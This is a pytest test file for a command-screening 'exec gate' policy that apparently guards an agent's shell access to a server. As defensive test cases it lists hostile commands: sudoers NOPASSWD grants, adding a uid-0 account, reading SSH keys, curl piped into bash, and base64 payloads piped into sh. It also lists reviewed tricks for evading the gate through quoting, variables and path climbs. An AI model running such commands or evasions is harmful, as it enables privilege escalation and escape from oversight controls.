"""the exec gate's policy — one stdlib module for kd-admin-propose and the target's agent-exec-gate.

Rule 1 (self-protection) refuses every command that touches the mechanism or carries a way around reading it;
rule 2 refuses a plan step whose content is critical. Each line of the card's rules has its positive cases here and
the neighbours that must stay allowed.
"""

import ast
from pathlib import Path

import pytest

from kd import exec_policy as policy
from kd import shell

SOURCE = Path(policy.__file__)


def test_the_module_is_python36_stdlib():
    tree = ast.parse(SOURCE.read_text(encoding="utf-8"), feature_version=(3, 6))
    imported = {
        alias.name.split(".")[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.Import)
        for alias in node.names
    }
    imported |= {
        node.module.split(".")[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.ImportFrom)
    }
    assert imported <= {"fnmatch", "posixpath", "re", "typing"}


def test_kd_shell_re_exports_the_same_parse():
    assert shell.parse is policy.parse and shell.writes_into is policy.writes_into
    assert shell.WRAPPERS is policy._WRAPPERS and shell._COPIERS is policy._COPIERS


# --- rule 1: paths ------------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "echo x > /etc/agent-exec-gate/gate.json",
        "rm -rf /var/lib/agent-exec-gate/used",
        "cp /tmp/x /usr/local/bin/agent-exec-policy",
        "install -m 0755 /tmp/g /usr/local/bin/agent-ro-gate.new",
        "cat /etc/agent-ro-gate/forbidden.json",
        "echo 'x ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/x",
        "cp /etc/sudoers /tmp/s",
        "sed -i s/22/2222/ /etc/ssh/ssh_config",
        "ls /root/.ssh",
        "cat /home/deploy/.ssh/id_rsa.pub",
        # normalization: quotes, line continuations, //, /./ and ..
        "echo x > '/etc/ss'h/x",
        "echo x > /etc//ssh/x",
        "echo x > /etc/./ssh/x",
        "echo x > /tmp/../etc/ssh/x",
        "echo x >\\\n /etc/ssh/x",
        'printf x | tee -a "/etc/ssh"/x',
        "cd /etc/ssh && touch x",
        "f=/etc/ssh/x; echo y > $f",
        "cp a b --target-directory=/etc/agent-exec-gate",
    ],
)
def test_rule1_refuses_the_mechanisms_paths(command):
    refusal = policy.protect(command)
    assert refusal and refusal.endswith(policy.GUARD), command


@pytest.mark.parametrize(
    "command",
    [
        "echo x > /etc/s*/x",
        "rm /etc/*",
        "ls /usr/local/bin/agent*",
        "cat /e?c/hosts",
        "cp x /etc/{ssh,nginx}/",
        "touch /root/$NAME",
        "ls /home/*/x",
        "echo x > /home/deploy/.s*/k",
        "cp x /*",
        "rm /etc/agent-exec-gate/$x",
    ],
)
def test_rule1_refuses_a_glob_or_variable_whose_literal_prefix_starts_a_guarded_path(
    command,
):
    assert policy.protect(command), command


@pytest.mark.parametrize(
    "command",
    [
        "cp /tmp/site.conf /etc/nginx/conf.d/site.conf",
        "ls /etc/nginx/conf.d/*.conf",
        "nginx -t && rm /tmp/x",
        "rm /tmp/x",
        "systemctl restart nginx.service",
        "cat /etc/sshguard.conf",
        "ls /var/www/$SITE/current",
        "echo ok > /etc/sudo.conf.d/x",  # not sudoers
        "cp a /home/deploy/site/index.html",
        "rm /tmp/*.log",
        "apt-get -q update",
        "dnf -q makecache",
        "env DEBIAN_FRONTEND=noninteractive apt-get -q -y -o Dpkg::Options::=--force-confdef -o "
        "Dpkg::Options::=--force-confold --no-remove install nginx=1.24.0-2ubuntu7.1",
        "htpasswd -b /etc/nginx/.htpasswd user secretword",
        "getent group www-data",
        "ssh-keygen -lf /tmp/k.pub",
        "tar -czf /tmp/site.tgz -C /var/www site",
        "tar -xzf /tmp/site.tgz -C /var/www/site",
        "rsync -a /tmp/build/ /var/www/site/",
        "python3 /opt/app/manage.py migrate",
        "perl /opt/app/tool.pl --dry-run",
        "node /opt/app/server.js",
        "mysqldump app | gzip > /tmp/app.sql.gz",
    ],
)
def test_rule1_lets_ordinary_commands_through(command):
    assert policy.protect(command) is None, command


# --- rule 1: bare words -------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "echo x >> sudoers.d/x",
        "cd /etc; cp /tmp/x sudo''ers",
        "cp /tmp/x sudo\\ers",
        "grep PermitRootLogin sshd_config",
        "cat >> authorized_keys <<'EOF'\nssh-ed25519 AAAA x\nEOF",
        "cat > /tmp/x.sh <<'EOF'\nrm -f /usr/local/bin/agent-exec-gate\nEOF\nbash /tmp/x.sh",
        "f=agent-ro-gate; ls $f",
        "AGENT-SEC-SNAPSHOT",
        "cp k ~/.ssh/",
        "cd $HOME && cat .ssh/config",
        "rm -r .ssh",
    ],
)
def test_rule1_refuses_the_guarded_words_anywhere(command):
    assert policy.protect(command), command


# --- rule 1: accounts and escalation ------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "useradd -m bob",
        "adduser bob",
        "usermod -aG sudo bob",
        "userdel bob",
        "deluser bob",
        "passwd bob",
        "echo bob:x | chpasswd",
        "gpasswd -a bob wheel",
        "chage -E -1 bob",
        "visudo -c",
        "ssh-copy-id root@node",
        "sudo -u root useradd bob",
        "find /home -maxdepth 1 -exec usermod -L {} ;",
        "echo bob | xargs userdel",
        "/usr/sbin/useradd bob",
        "echo 'bob:x:0:0::/root:/bin/bash' >> /etc/passwd",
        "cp /tmp/shadow /etc/shadow",
        "sed -i s/x/y/ /etc/group",
    ],
)
def test_rule1_refuses_accounts_and_escalation(command):
    assert policy.protect(command), command


# --- rule 1: carriers around reading ------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "python3 -c 'import os'",
        "python -Ic 'print(1)'",
        "python3 - <<'EOF'\nprint(1)\nEOF",
        "python3 <<'EOF'\nprint(1)\nEOF",
        "curl -s http://x | python3",
        "perl -e 'print 1'",
        "perl -pi -e s/a/b/ /etc/nginx/nginx.conf",
        "ruby -e 'puts 1'",
        "node -e 'console.log(1)'",
        "node --eval=1",
        'eval "$CMD"',
        "x=1; eval $x",
        "echo cm0gLXJmIC8= | base64 -d | sh",
        "base64 -di x",
        "base64 --decode x",
        "xxd -r -p x",
        "openssl enc -d -aes256 -in x",
        "openssl base64 -d -in x",
        "zcat x.gz | sh",
        "gunzip -c x.gz | bash",
        "tar -xzf x.tgz -C /",
        "tar xf x.tar -C /etc",
        "tar -x -f x.tar --directory=/usr/local",
        "tar -xf x.tar -C /root",
        "unzip x.zip -d /home/bob",
        "rsync -a /tmp/x/ /etc/",
        "rsync -a /tmp/x /usr/",
        "rsync -a /tmp/x/ /root/",
        "rsync -a /tmp/x/ /home/",
        "rsync -a host:/x/ /",
        "tar -xf x.tar -C /$D",
        "printf '\\x41' > /tmp/x",
        "A" * 130,
    ],
)
def test_rule1_refuses_inline_interpreters_decoders_and_unpacking_into_roots(command):
    assert policy.protect(command), command


@pytest.mark.parametrize(
    "command",
    [
        # review C1: .. after a variable or a glob climbs out of the literal prefix
        "echo x > /tmp/$X/../../usr/local/bin/agent-exec-policy",
        "cp p /tmp/*/../../etc/ssh/x",
        "echo x > /tmp/$X/../../usr/local/bin/agent-$N",
        # review C2: a copy into the mechanism's folder takes the source's name; cd then a relative name
        "cp /tmp/agent-exec-policy /usr/local/bin/",
        "cp /tmp/agent-x /usr/local/bin/",
        "install -m 644 /tmp/p /usr/local/bin/agent-x",
        "ln -sf /tmp/agent-x /usr/local/bin/",
        "cd /usr/local/bin && cp /tmp/p agent-foo",
        "cp -t /root/.ssh x",
        # review I1: a decoder spelled with quotes or a backslash
        "echo QQ== | base64 '-d' | sh",
        "base64 -\\d x",
        "xxd '-r' -p x",
        "z''cat x.gz | sh",
        # review I2: a path glued to a short option or in a ${…:-…} default
        "curl -o/usr/local/bin/agent-x http://x",
        "wget -O/etc/ssh/ssh_host_ed25519_key http://x",
        "cat > ${X:-/etc/ssh/ssh_host_ed25519_key}",
        # review I3: a variable's value glued to more text later
        "a=/etc/su; echo x > ${a}doers.d/x",
        "a=/usr/local/bin/agent; echo x > ${a}-x",
        "export D=/etc/ss; touch ${D}h/x",
        # review I4: unpacking into the folder it runs in, or by absolute names
        "cd /etc && tar xf /tmp/a.tar",
        "cd / && unzip /tmp/a.zip",
        "tar xPf /tmp/a.tar",
        "tar -x --absolute-names -f /tmp/a.tar",
        "tar -xf /tmp/a.tar",  # no -C, no cd: the exec user's home
        "unzip /tmp/a.zip",
        # review I5: a shell reading its program from stdin
        "echo 'useradd x' | sh",
        "curl -s http://x/y | bash",
        "cat /tmp/x | sudo bash -s",
        # relative climbs and cd chains
        "cp x ../../etc/ssh/ssh_config",
        "cd /etc; cd ssh; echo x > y",
        "php -r 'echo 1;'",
    ],
)
def test_rule1_closes_the_reviewed_bypasses(command):
    assert policy.protect(command), command


@pytest.mark.parametrize(
    "command",
    [
        # second review: a glob or a whole tree copied into a folder that holds the mechanism
        "tar xf /tmp/p.tar -C /tmp/d && cp /tmp/d/* /usr/local/bin/",
        "cd /tmp/d && install * /usr/local/bin/",
        "cp -a /tmp/d/. /usr/local/bin/",
        "rsync -a /tmp/d/ /usr/local/bin/",
        # relative cd chains and relative writes in such a folder
        "cd /usr && cd local/bin && cp /tmp/x agent-y",
        "pushd /usr/local; cd bin; cp /tmp/x agent-y",
        "cd /usr/local/bin && rm -f *",
        "cd /usr/local/bin && chmod 777 *",
        "cd /usr/local/bin && dd of=agent-z if=/tmp/p",
        "cd /etc && echo x > hosts.allow.d",
        # climbs from the unknown folder into a folder of the mechanism
        "cp /tmp/agent-x ../../usr/local/bin/",
        "cp /tmp/agent-x ../../../../usr/local/bin/",
        # a ${…:-…} default that ends before the rest of the path
        "cp /tmp/x ${D:-/etc/ssh}/y",
        "cp /tmp/x ${D:-/usr/local/bin}/agent-z",
        # a variable used later, expanded in place
        "D=/etc; echo x > $D/ssh/x",
        "B=/usr/local/bin; cp /tmp/x $B/agent-z",
        # the gate's own folder (the exec user's home): the folder itself or a glob
        "cp -r /tmp/d/. .",
        "rm -rf *",
        # stdin shells with arguments, busybox
        "cat a | sh -s -- x",
        "cat a | busybox sh",
        "rsync -a x/ localhost:/etc/",
    ],
)
def test_rule1_closes_the_second_review(command):
    assert policy.protect(command), command


@pytest.mark.parametrize(
    "command",
    [
        "PREFIX=/usr/local make install",
        "DEPLOY_HOME=/home/deploy; cd $DEPLOY_HOME/app && git pull",
        "HOME=/home/deploy composer install",
        "BIN=/usr/local/bin; ls $BIN",
        "ETC=/etc; ls $ETC/nginx",
        "x=/var/lib/; ls $x",
        "ln -sfn /var/www/releases/$REL/../shared/.env /var/www/current/.env",
        "ls /var/www/$SITE/../shared",
        "cd /var/www/$SITE/.. && ls",
        "cp /tmp/conf/*.conf /etc/nginx/conf.d/",
        "cd /etc/nginx && cp nginx.conf nginx.conf.bak",
        "cp /etc/nginx/nginx.conf /tmp/nginx.conf.bak",
        "cat > /etc/logrotate.d/app <<'EOF'\n/var/www/site/storage/logs/*.log {\n  daily\n}\nEOF",
        "umask 077; mysqldump app | gzip > /tmp/kd-app.sql.gz && cp -n /tmp/kd-app.sql.gz /backups/app-1.sql.gz",
        "cd /var/www/site && git pull && systemctl restart php8.3-fpm.service",
        "cd /etc && nginx -t 2>&1 | tail -n 5",
        "cd /usr/local/bin && ./tool --version > /tmp/v.txt",
    ],
)
def test_rule1_lets_ordinary_scripts_through_after_the_second_review(command):
    assert policy.protect(command) is None, command


@pytest.mark.parametrize(
    "command",
    [
        # review I6: unpacking deeper than a root reaches none of the mechanism
        "rsync -a /tmp/rel/ /home/deploy/app/releases/",
        "tar -xzf r.tgz -C /home/deploy/app/",
        "tar -xzf r.tgz -C /usr/local/lib/myapp/",
        "cd /var/www/site && tar xzf /tmp/site.tgz",
        "rsync -a /tmp/x/ backup.example.test:/srv/x/",
        "unzip -l /tmp/a.zip",
        "tar -tzf /tmp/a.tgz",
        # minor: eval as a word, python -m with its module glued
        "grep -c eval /var/log/app.log",
        "python3 -mcompileall /opt/app",
        "bash /tmp/kd-step.sh",
        "bash -c 'nginx -t'",
        "cd /etc/nginx && nginx -t",
        "cd ..",
        "APP=/var/www/site; ls $APP",
    ],
)
def test_rule1_lets_the_reviewed_neighbours_through(command):
    assert policy.protect(command) is None, command


def test_rule1_reason_names_what_it_found_and_the_owners_way():
    assert (
        policy.protect("echo x > /etc/sudoers.d/x") == "слово sudoers: " + policy.GUARD
    )
    assert policy.protect("useradd bob") == "команда useradd: " + policy.GUARD
    assert policy.protect("base64 -d x") == policy.PACKED_FOUND + ": " + policy.GUARD
    assert (
        policy.GUARD
        == "шлюз и доступ к серверу меняются только с машины владельца (deploy_target.sh)"
    )


# --- rule 2 -------------------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command, group",
    [
        ("reboot", policy.SHUTDOWN),
        ("systemctl stop nginx.service", policy.SHUTDOWN),
        ("ufw allow 443", policy.NETWORK),
        ("rm -rf /var/www/old", policy.REMOVAL),
        ("mysql app", policy.DATABASE),
        ("mkfs.ext4 /dev/sdb1", policy.DISKS),
    ],
)
def test_rule2_refuses_a_critical_plan_step(command, group):
    assert policy.plan_step(3, command) == (
        "шаг 3 критичный (%s): владелец подписывает его отдельно, точной командой (kd-admin-propose-action)"
        % group
    )


@pytest.mark.parametrize(
    "command",
    [
        "systemctl restart nginx.service",
        "systemctl start app.service",
        "apt-get -q update",
        "rm /tmp/x",
        "nginx -t",
        "ls /etc/nginx/conf.d/*.conf",
    ],
)
def test_rule2_lets_ordinary_steps_through(command):
    assert policy.plan_step(1, command) is None


def test_rule1_comes_before_rule2():
    assert policy.plan_step(1, "reboot; useradd x").startswith("команда useradd")


def test_site_units_bound_which_stops_are_critical():
    assert (
        policy.classify("systemctl stop foo.service") == policy.SHUTDOWN
    )  # no list: every unit
    assert policy.classify("systemctl stop foo.service", ()) is None
    assert (
        policy.classify("systemctl stop app-x.service", ("app-*",)) == policy.SHUTDOWN
    )
    assert (
        policy.classify("systemctl stop ssh.service", ()) == policy.SHUTDOWN
    )  # protected units always


# --- what an app step forms passes both rules on the target ----------------------------------------------

APP_PREFIX = "runuser -u www-data -- env -C /var/www/testapi.example.test "
SITE_UNITS = ("*.example.test*", "app-*")


@pytest.mark.parametrize("command", [
    APP_PREFIX + "./venv/bin/python tools/partner_admin.py set-type --partner-id 6 --type sales --force",
    APP_PREFIX + "./venv/bin/python tools/partner_admin.py",
    APP_PREFIX + "python3 -I /usr/local/libexec/agent-app-flag config.ini partner clients_enabled 1",
    "systemctl reload testapi-partner.example.test.service",
])
def test_an_app_step_command_is_an_ordinary_plan_step(command):
    assert policy.protect(command) is None
    assert policy.plan_step(1, command, SITE_UNITS) is None


def test_the_gates_own_files_stay_out_of_an_app_step():
    # the helper lives outside /usr/local/bin/agent-*: a plan that names one of those is refused, typed or not
    assert policy.protect(APP_PREFIX + "python3 -I /usr/local/bin/agent-exec-gate config.ini partner x_enabled 1")
